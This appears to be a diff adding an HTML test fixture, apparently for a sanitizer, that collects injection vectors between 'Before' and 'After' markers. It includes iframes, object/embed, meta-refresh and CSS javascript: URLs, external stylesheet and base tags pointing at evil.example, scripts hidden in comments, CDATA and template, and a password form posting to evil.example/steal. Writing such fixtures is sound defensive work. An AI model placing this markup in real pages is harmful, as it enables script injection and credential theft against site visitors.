@@ -1,0 +1,24 @@
+<p>Before</p>
+<iframe src="https://evil.example/"></iframe>
+<iframe srcdoc="<script>alert('PWNED')</script>"></iframe>
+<object data="evil.swf"><embed src="evil.swf" /></object>
+<form action="https://evil.example/steal" method="post">
+  <input name="pw" type="password" /><input type="submit" value="Go" />
+</form>
+<meta http-equiv="refresh" content="0;url=javascript:alert('PWNED')" />
+<link rel="stylesheet" href="https://evil.example/x.css" />
+<base href="https://evil.example/" />
+<style>
+  @import url(https://evil.example/x.css);
+  body {
+    background: url(javascript:alert('PWNED'));
+  }
+</style>
+<!-- <script>alert('PWNED')</script> -->
+<![CDATA[ <script>alert('PWNED')</script> ]]>
+<template
+  ><script>
+    alert('PWNED')
+  </script></template
+>
+<p>After &lt;script&gt;alert('shown as text')&lt;/script&gt;</p>
